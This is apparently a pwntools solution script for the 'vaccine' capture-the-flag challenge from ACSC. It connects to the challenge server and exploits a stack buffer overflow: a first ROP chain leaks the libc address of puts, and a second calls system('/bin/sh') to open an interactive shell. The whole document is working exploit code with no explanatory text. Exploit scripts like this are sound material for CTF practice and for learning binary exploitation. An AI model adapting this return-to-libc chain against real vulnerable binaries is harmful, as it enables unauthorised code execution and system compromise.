from pwn import *
r = remote("vaccine.chal.ctf.acsc.asia", 1337)
# r = process("./vaccine_patched")
# gdb.attach(r, gdbscript='''
# b* main+135
# b* main+417
# c
#             ''')
exe = ELF("./vaccine_patched")
libc = ELF('./libc-2.31.so')

input(    )
pop_rdi = 0x0000000000401443
payload = b"\0" * 264 + p64(pop_rdi)
payload += p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.sym['main'])
r.sendlineafter(b"vaccine: ", payload)

r.recvlines(2)
leak_libc = u64(r.recvline(keepends = False) + b"\0\0")
libc.address = leak_libc - libc.sym["puts"]
log.info("leak libc: " + hex(leak_libc))
log.info("leak base: " + hex(libc.address))

payload1 = b"\0" * 264 
payload1 += p64(0x000000000040101a)
payload1 += p64(pop_rdi)
payload1 += p64(next(libc.search(b'/bin/sh')))
payload1 += p64(libc.sym['system'])
r.sendlineafter(b"vaccine: ", payload1)
r.interactive()
